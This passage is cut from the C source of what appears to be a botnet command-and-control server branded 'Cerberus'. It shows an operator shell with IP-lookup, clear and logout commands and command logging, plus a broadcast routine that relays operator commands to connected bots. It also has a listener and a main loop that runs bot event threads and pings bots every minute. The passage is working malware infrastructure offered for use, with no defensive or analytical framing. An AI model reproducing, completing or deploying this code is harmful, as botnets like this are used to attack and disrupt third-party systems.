                            if ((retrv = read(IPLSock, &ch, 1)) != 1)
                                break;
                
                            header_parser = (header_parser << 8) | ch;
                        }
                        memset(iplbuffer, 0, sizeof(iplbuffer));
                        while(ret = read(IPLSock, iplbuffer, 1024))
                        {
                            iplbuffer[ret] = '\0';
                            /*if(strlen(iplbuffer) > 1)
                                printf("\x1b[36m%s\x1b[31m\n", buffer);*/
                        }
                        //printf("%s\n", iplbuffer);
                        if(strstr(iplbuffer, "<title>404"))
                        {
                            char iplookup_host_token[20];
                            sprintf(iplookup_host_token, "%s", iplookup_host);
                            int ip_prefix = atoi(strtok(iplookup_host_token, "."));
                            sprintf(botnet, "\x1b[31m[IPLookup] Failed, API can't be located on server %d.*.*.*:80\x1b[0m\r\n", ip_prefix);
                            memset(iplookup_host_token, 0, sizeof(iplookup_host_token));
                        }
                        else if(strstr(iplbuffer, "nickers"))
                            sprintf(botnet, "\x1b[31m[IPLookup] Failed, Hosting server needs to have php installed for api to work...\x1b[0m\r\n");
                        else sprintf(botnet, "\033[0;38;5;218m[+]--- \x1b[0mResults\033[0;38;5;218m ---[+]\r\n\x1b[0m%s\x1b[31m\r\n", iplbuffer);
                        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                    else
                    {
                        //printf("[\x1b[31m-\x1b[31m] Failed to send request headers...\n");
                        sprintf(botnet, "\x1b[31m[IPLookup] Failed to send request headers...\r\n");
                        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                }
                close(IPLSock);
            }
        }


			if(strstr(buf, "CLEAR") || strstr(buf, "clear") || strstr(buf, "Clear") || strstr(buf, "cls") || strstr(buf, "CLS") || strstr(buf, "Cls")) {
				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
				sprintf(clearscreen, "\033[2J\033[1;1H");
    			if (send(datafd, banner1lol1, strlen(banner1lol1), MSG_NOSIGNAL) == -1) goto end;
    			if (send(datafd, banner1lol66, strlen(banner1lol66), MSG_NOSIGNAL) == -1) goto end;
    			if (send(datafd, banner1lol3, strlen(banner1lol3), MSG_NOSIGNAL) == -1) goto end;
    			if (send(datafd, banner1lol4, strlen(banner1lol4), MSG_NOSIGNAL) == -1) goto end;
    			if (send(datafd, banner1lol5, strlen(banner1lol5), MSG_NOSIGNAL) == -1) goto end;
    			if (send(datafd, banner1lol6, strlen(banner1lol6), MSG_NOSIGNAL) == -1) goto end;
    			if (send(datafd, banner1lol21, strlen(banner1lol21), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
				while(1) {
		char input [7000];
		char inpue [7000];
        sprintf(input, "\033[0;38;5;218m╔═════Cerberus═══$\r\n");
        sprintf(inpue, "\033[0;38;5;218m╚═══════>\033[1;32m ");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, inpue, strlen(inpue), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "logout") || strstr(buf, "LOGOUT") || strstr(buf, "Logout") || strstr(buf, "ext") || strstr(buf, "EXIT") || strstr(buf, "exit")) {
				char logoutmessage [2048];
				memset(logoutmessage, 0, 2048);
				sprintf(logoutmessage, "\033[0;38;5;218m Logging out...", accounts[find_line].username);
				if(send(datafd, logoutmessage, strlen(logoutmessage), MSG_NOSIGNAL) == -1)goto end;
				sleep(2);
				goto end;
			}

            trim(buf);
		char input [7000];
		char inpue [7000];
        sprintf(input, "\033[0;38;5;218m╔═════Cerberus═══$\r\n");
        sprintf(inpue, "\033[0;38;5;218m╚═══════>\033[1;32m ");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, inpue, strlen(inpue), MSG_NOSIGNAL) == -1) goto end;
            if(strlen(buf) == 0) continue;
            printf("%s: \"%s\"\n",accounts[find_line].username, buf);

			FILE *LogFile;
            LogFile = fopen("server_history.log", "a");
			time_t now;
			struct tm *gmt;
			char formatted_gmt [50];
			char lcltime[50];
			now = time(NULL);
			gmt = gmtime(&now);
			strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
            fprintf(LogFile, "[%s]: %s\n", formatted_gmt, buf);
            fclose(LogFile);
            broadcast(buf, datafd, accounts[find_line].username);
            memset(buf, 0, 2048);
        }

		end:
		managements[datafd].connected = 0;
		close(datafd);
		OperatorsConnected--;
}
/*STARCODE*/
void *BotListener(int port) {
	int sockfd, newsockfd;
	socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd,5);
    clilen = sizeof(cli_addr);
    while(1) {
		newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
}}
int main (int argc, char *argv[], void *sock) {
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4) {
			fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }

		port = atoi(argv[3]);
		
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "ZERO");
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}
